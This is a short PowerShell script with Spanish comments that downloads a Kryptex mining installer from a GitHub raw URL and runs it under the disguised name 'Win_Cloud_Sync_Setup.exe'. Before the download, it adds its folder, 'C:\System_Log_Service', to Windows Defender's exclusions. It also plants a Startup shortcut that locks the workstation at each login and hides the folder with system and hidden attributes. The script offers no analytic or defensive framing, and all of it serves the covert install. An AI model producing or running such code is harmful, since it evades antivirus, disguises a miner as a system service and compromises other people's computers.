# --- CONFIGURACIÓN CON TUS NOMBRES REALES ---
$url_exe = "https://raw.githubusercontent.com/DmI29/rapidman/main/kryptex-setup-latest-v5.exe"
$dir = "C:\System_Log_Service"
$exePath = "$dir\Win_Cloud_Sync_Setup.exe"

# 1. Preparar entorno y Antivirus
if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force }
Add-MpPreference -ExclusionPath $dir

# 2. MÉTODO DE DESCARGA (Con TLS 1.2 forzado)
Write-Host "Conectando a GitHub..." -ForegroundColor Cyan
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("user-agent", "Mozilla/5.0")
    
    Write-Host "Descargando instalador..." -ForegroundColor Yellow
    $webClient.DownloadFile($url_exe, $exePath)
    Write-Host "Descarga exitosa." -ForegroundColor Green
} catch {
    Write-Host "Error de red: La conexion fue cerrada por el servidor o firewall." -ForegroundColor Red
    exit
}

# 3. Crear el Bloqueo Automático
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$s = New-Object -ComObject WScript.Shell
$shortcut = $s.CreateShortcut("$startupPath\WinServiceLock.lnk")
$shortcut.TargetPath = "rundll32.exe"
$shortcut.Arguments = "user32.dll,LockWorkStation"
$shortcut.Save()

# 4. Ocultar y Ejecutar
attrib +s +h $dir
if (Test-Path $exePath) {
    Start-Process -FilePath $exePath
}
